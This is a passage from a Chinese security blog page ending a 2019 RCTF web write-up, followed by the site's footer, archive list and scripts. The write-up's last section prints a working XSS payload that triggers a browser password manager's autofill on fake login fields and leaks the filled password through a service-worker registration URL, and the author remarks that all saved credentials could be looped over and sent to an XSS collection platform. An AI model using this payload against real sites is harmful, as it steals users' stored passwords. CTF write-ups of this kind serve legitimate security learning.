+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"username"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">id</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="built_in">document</span>.querySelector(<span class="string">'[type=username]'</span>).click()&#125;,<span class="number">500</span>);</span></span><br><span class="line"><span class="javascript">  setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="built_in">document</span>.getElementById(<span class="string">'cip-ui-id-4'</span>).click()&#125;, <span class="number">1000</span>);</span></span><br><span class="line"><span class="javascript">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;navigator.serviceWorker.register(<span class="string">'/uploads/511b3c8839bd36230c4aa3c5ff5545ef.js?'</span> + <span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.getElementById(<span class="string">'password'</span>).value), &#123;<span class="attr">scope</span>:<span class="string">'/uploads/'</span>&#125;);&#125;, <span class="number">1500</span>)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过这道题我们也知道浏览器保管密码也是会被偷取的，这里拓展一下，是能够写个脚本遍历所有的用户名和密码然后依次发送回xss平台的。</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://hurricane618.me">hurricane618</a>
+            </p><p>原文链接：<a href="https://hurricane618.me/2019/05/24/2019rctf-some-writeup/">https://hurricane618.me/2019/05/24/2019rctf-some-writeup/</a>
+            </p><p>发表日期：<a href="https://hurricane618.me/2019/05/24/2019rctf-some-writeup/">May 24th 2019, 10:23:17 am</a>
+            </p><p>更新日期：<a href="https://hurricane618.me/2019/05/24/2019rctf-some-writeup/">May 24th 2019, 10:23:17 am</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/04/29/2019ddctf-unsolved-writeup/" title="2019DDCTF 未解决的web题 writeup">
+                    <div class="prevTitle">2019DDCTF 未解决的web题 writeup</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    <div id="disqus_thread"></div>
+    <script>
+        /**
+    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+        
+        var disqus_config = function () {
+        this.page.url = "https://hurricane618.me/2019/05/24/2019rctf-some-writeup/";  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = "2019RCTF 部分Web的WriteUp"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        };
+        
+        (function () { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+            s.src = 'https://hurricane618.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:hurricane618@hotmail.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/hurricane618" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//twitter.com/hurricane_618" class="iconfont-archer twitter" target="_blank" title="twitter"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+    
+    <span id="busuanzi_container_site_uv">已经有 <span id="busuanzi_value_site_uv"></span> 个不明生物光临此地</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nextphp"><span class="toc-number">1.</span> <span class="toc-text">nextphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jail"><span class="toc-number">2.</span> <span class="toc-text">jail</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#password"><span class="toc-number">3.</span> <span class="toc-text">password</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 17
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/24</span><a class="archive-post-title" href="/2019/05/24/2019rctf-some-writeup/">2019RCTF 部分Web的WriteUp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/29</span><a class="archive-post-title" href="/2019/04/29/2019ddctf-unsolved-writeup/">2019DDCTF 未解决的web题 writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href="/2019/04/19/2019ddctf-my-solutions-writeup/">2019DDCTF 部分我解决的题目writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/31</span><a class="archive-post-title" href="/2019/03/31/2019TCTF-web-writeup/">2019TCTF web writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href="/2019/03/02/serial-ports-translation-cn/">快速寻找串行接口</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/18</span><a class="archive-post-title" href="/2019/02/18/yingshi-camera-firmware-extract/">萤石某摄像头的安全分析--固件提取</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/03</span><a class="archive-post-title" href="/2019/02/03/thinkphp-5-0-23-rce/">thinkphp 5.0.23 rce分析和复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/27</span><a class="archive-post-title" href="/2019/01/27/haozi-xss-challenges/">haozi xss 挑战赛 writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/24</span><a class="archive-post-title" href="/2019/01/24/code-breaking-lumenserial/">code-breaking lumenserial 复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/10</span><a class="archive-post-title" href="/2019/01/10/code-breaking-esay-wp/">code-breaking easy部分题目writeup</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/15</span><a class="archive-post-title" href="/2018/08/15/google-ctf-beginner-part2/">Google CTF Beginner Part2</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href="/2018/08/01/dianfengjikeCTF-web/">巅峰极客CTF 部分Web复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href="/2018/07/18/google-ctf-beginner-part1/">Google CTF Beginner Part1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/08</span><a class="archive-post-title" href="/2018/07/08/google-ctf-beginner-js-safe-1/">Google CTF Beginner JS Safe 1 复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/01</span><a class="archive-post-title" href="/2018/07/01/phpmyadmin4-8-1-background-LFI/">phpmyadmin4.8.1 后台LFI</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/2018/06/30/csp-bypass-summary/">CSP绕过总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/26</span><a class="archive-post-title" href="/2018/06/26/new-start/">新的开始</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="JAVA"><span class="iconfont-archer">&#xe606;</span>JAVA</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="闲聊"><span class="iconfont-archer">&#xe606;</span>闲聊</span>
+    
+        <span class="sidebar-tag-name" data-tags="IOT"><span class="iconfont-archer">&#xe606;</span>IOT</span>
+    
+        <span class="sidebar-tag-name" data-tags="CSP"><span class="iconfont-archer">&#xe606;</span>CSP</span>
+    
+        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
+    
+        <span class="sidebar-tag-name" data-tags="翻译"><span class="iconfont-archer">&#xe606;</span>翻译</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="技术"><span class="iconfont-archer">&#xe60a;</span>技术</span>
+    
+        <span class="sidebar-category-name" data-categories="杂谈"><span class="iconfont-archer">&#xe60a;</span>杂谈</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "hurricane618"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
